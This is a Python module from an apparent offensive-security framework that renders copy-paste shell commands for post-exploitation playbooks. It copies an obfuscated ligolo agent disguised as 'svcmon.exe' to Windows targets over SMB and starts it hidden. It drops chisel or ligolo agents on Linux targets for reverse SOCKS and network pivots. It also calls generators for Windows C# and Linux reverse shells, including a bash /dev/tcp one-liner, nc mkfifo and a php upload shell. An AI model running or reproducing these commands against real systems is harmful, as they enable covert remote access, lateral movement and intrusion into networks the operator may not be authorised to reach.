"""Render the exact shell commands for the pivot/revshell playbook actions.

Called by :class:`~yhwach.runners.ArsenalDeployRunner` (auto-execute path) and
by ``yhwach revshell`` / ``yhwach pivot`` (operator-driven CLI). Every
renderer pulls binary paths from :mod:`yhwach.arsenal` so the output is copy-
paste ready with the canonical absolute paths.

Return shape is uniform: ``list[str]`` of one command / comment per line. No
side effects — these functions never touch a network or a filesystem. They
are the "what would you run" projection; the runner decides whether to ship
it via a Metasploit session, Adaptix, or hand it to the operator to run.

Coverage matches ``playbooks/pivot.yaml`` one-to-one:

  * ``pivot_ligolo_windows``        -> :func:`deploy_svcmon_and_route`
  * ``pivot_chisel_linux``          -> :func:`deploy_chisel_reverse_socks`
  * ``pivot_ligolo_linux``          -> :func:`deploy_ligolo_agent_linux`
  * ``generate_windows_revshell``   -> :func:`render_gen_sh`
  * ``generate_linux_revshell``     -> :func:`render_gen_linux_shell`
"""
from __future__ import annotations

from pathlib import Path

from yhwach import arsenal
from yhwach import config as yhconfig

# Kali-side ports. Match engine.render_pivot's defaults so a rendered
# multi-step block is consistent with the pivot summary in the brief.
LIGOLO_DEFAULT_PORT = 11601
CHISEL_DEFAULT_PORT = 9055
CHISEL_SOCKS_PORT = 1080

# Where a rendered revshell payload lands locally. artifact_dir would resolve
# a lab-scoped path if the DB is available; the pure renderer uses the workspace
# loot dir (env-overridable via $YHWACH_LOOT_DIR / $YHWACH_HOME) so it works
# without a DB handle. Callers with a DB should pass an override.
DEFAULT_LOOT_REVSHELLS = yhconfig.loot_dir() / "revshells"


def _header(title: str) -> str:
    return f"== {title} =="


def deploy_svcmon_and_route(
    *,
    target_ip: str,
    kali_ip: str,
    subnet: str,
    lport: int = LIGOLO_DEFAULT_PORT,
) -> list[str]:
    """Render the three-step Windows ligolo deployment (svcmon.exe canonical).

    Steps: (1) copy svcmon.exe to target; (2) target-side start; (3) Kali-side
    proxy + route. Every path is absolute, resolved via :mod:`yhwach.arsenal`.
    """
    svcmon = arsenal.get("SVCMON_WIN").path
    proxy = arsenal.get("LIGOLO_PROXY").path
    return [
        _header(f"Deploy svcmon.exe -> {target_ip} (Windows), route {subnet}"),
        "  # (1) Copy the obfuscated agent to the target (SMB / HTTP / msf upload):",
        f"  #     local canonical: {svcmon}",
        f"  $ smbput //{target_ip}/C$/Users/Public/svcmon.exe {svcmon}",
        f"  # (2) On the target ({target_ip}) — kick svcmon:",
        f"  $ Start-Process -FilePath 'C:\\Users\\Public\\svcmon.exe' "
        f"-ArgumentList '-connect {kali_ip}:{lport} -ignore-cert' -WindowStyle Hidden",
        "  # (3) On Kali — proxy + route:",
        f"  $ sudo {proxy} -selfcert -laddr 0.0.0.0:{lport}",
        "  ligolo>> session   # then: start",
        f"  $ sudo ip route add {subnet} dev ligolo",
    ]


def deploy_chisel_reverse_socks(
    *,
    target_ip: str,
    kali_ip: str,
    subnet: str,
    lport: int = CHISEL_DEFAULT_PORT,
    socks_port: int = CHISEL_SOCKS_PORT,
) -> list[str]:
    """Render the chisel reverse-SOCKS pivot (Linux target, no root needed).

    Order matters: start the Kali server first, then the target-side client.
    Target-side chisel is dropped from the same canonical location as the
    Kali binary (``/usr/local/bin/chisel``) — a static Go ELF, copy-paste.
    """
    chisel = arsenal.get("CHISEL").path
    return [
        _header(f"Deploy chisel reverse-SOCKS -> {target_ip} (Linux), reach {subnet}"),
        "  # (1) On Kali — chisel server in reverse mode (FIRST):",
        f"  $ {chisel} server -p {lport} --reverse",
        "  # (2) Deliver chisel to the target (curl from Kali payload dir works):",
        f"  #     local canonical: {chisel}",
        f"  $ scp {chisel} {target_ip}:/tmp/chisel   # or curl / http drop / msf upload",
        f"  $ ssh {target_ip} 'chmod +x /tmp/chisel'",
        f"  # (3) On the target ({target_ip}) — connect back and expose SOCKS:",
        f"  $ /tmp/chisel client {kali_ip}:{lport} R:{socks_port}:socks &",
        f"  # -> SOCKS5 on Kali at 127.0.0.1:{socks_port} covers {subnet}",
        f"  #     proxychains config: `socks5 127.0.0.1 {socks_port}`",
        f"  #     netexec: `nxc smb <target> --socks-host 127.0.0.1 --socks-port {socks_port}`",
    ]


def deploy_ligolo_agent_linux(
    *,
    target_ip: str,
    kali_ip: str,
    subnet: str,
    lport: int = LIGOLO_DEFAULT_PORT,
) -> list[str]:
    """Render the Linux ligolo agent deployment (full-tun L3 route).

    Alternative to chisel when a real L3 route is needed (not just SOCKS).
    Requires root on Kali for the ``tun`` interface. Prefer chisel unless
    L3 is genuinely required.
    """
    agent = arsenal.get("LIGOLO_AGENT_LINUX").path
    proxy = arsenal.get("LIGOLO_PROXY").path
    return [
        _header(f"Deploy ligolo-agent-linux -> {target_ip} (Linux), route {subnet}"),
        "  # (1) Copy the Linux ligolo agent to the target:",
        f"  #     local canonical: {agent}",
        f"  $ scp {agent} {target_ip}:/tmp/ligolo-agent-linux",
        f"  $ ssh {target_ip} 'chmod +x /tmp/ligolo-agent-linux'",
        "  # (2) On Kali — proxy first (needs root for tun):",
        f"  $ sudo {proxy} -selfcert -laddr 0.0.0.0:{lport}",
        f"  # (3) On the target ({target_ip}) — connect back:",
        f"  $ /tmp/ligolo-agent-linux -connect {kali_ip}:{lport} -ignore-cert &",
        "  # (4) On Kali (ligolo prompt) -> start; then route:",
        "  ligolo>> session   # pick this session, then: start",
        f"  $ sudo ip route add {subnet} dev ligolo",
    ]


def render_gen_sh(
    *,
    kali_ip: str,
    lport: int,
    outdir: Path | str | None = None,
    max_retries: int = 5,
    jitter_ms: int = 3000,
    iface: str = "tun0",
) -> list[str]:
    """Render the invocation of the canonical Windows C# revshell generator.

    ``gen.sh`` accepts ``[iface] [port] [output_dir] [max_retries] [jitter_ms]``.
    ``iface`` is preferred over an IP argument because the generator resolves
    LHOST from the interface (handles multi-VPN operator boxes cleanly). The
    ``kali_ip`` param is threaded through so callers can record what they
    intended even when the generator auto-detects.
    """
    gen = arsenal.get("REVSHELL_GEN_WIN").path
    out = Path(outdir) if outdir else DEFAULT_LOOT_REVSHELLS
    return [
        _header(f"Generate Windows C# revshell -> {kali_ip}:{lport} (from {iface})"),
        f"  # canonical generator: {gen}",
        f"  $ mkdir -p {out}",
        f"  $ {gen} {iface} {lport} {out} {max_retries} {jitter_ms}",
        f"  # -> outputs shell.cs under {out}/",
        f"  # Compile on Kali: `mcs -out:svc.exe {out}/shell.cs`",
        f"  # Compile on Windows target: `csc.exe /out:svc.exe {out}\\shell.cs`",
    ]


def render_gen_linux_shell(
    *,
    kali_ip: str,
    lport: int,
    outdir: Path | str | None = None,
    iface: str = "tun0",
) -> list[str]:
    """Render the invocation of the Linux revshell generator (7 payloads).

    ``gen_linux_shell.sh`` emits bash /dev/tcp one-liner, python PTY, socat,
    nc + mkfifo, perl, php upload shell, and an ELF built with gcc — pick
    the one that fits the delivery vector on the target.
    """
    gen = arsenal.get("REVSHELL_GEN_LINUX").path
    out = Path(outdir) if outdir else DEFAULT_LOOT_REVSHELLS
    return [
        _header(f"Generate Linux revshell payloads -> {kali_ip}:{lport} (from {iface})"),
        f"  # canonical generator: {gen}",
        f"  $ mkdir -p {out}",
        f"  $ {gen} {iface} {lport} {out}",
        f"  # -> emits under {out}/: bash_devtcp.sh, python_pty.sh, socat.sh,",
        "  #    nc_mkfifo.sh, perl.sh, php_shell.php, elf_revshell (ELF via gcc).",
    ]


# Registry: playbook rule id -> renderer function. Kept here so the runner
# and the CLI both dispatch through one table (no duplicate switch/case).
RENDERERS = {
    "pivot_ligolo_windows": deploy_svcmon_and_route,
    "pivot_chisel_linux": deploy_chisel_reverse_socks,
    "pivot_ligolo_linux": deploy_ligolo_agent_linux,
    "generate_windows_revshell": render_gen_sh,
    "generate_linux_revshell": render_gen_linux_shell,
}
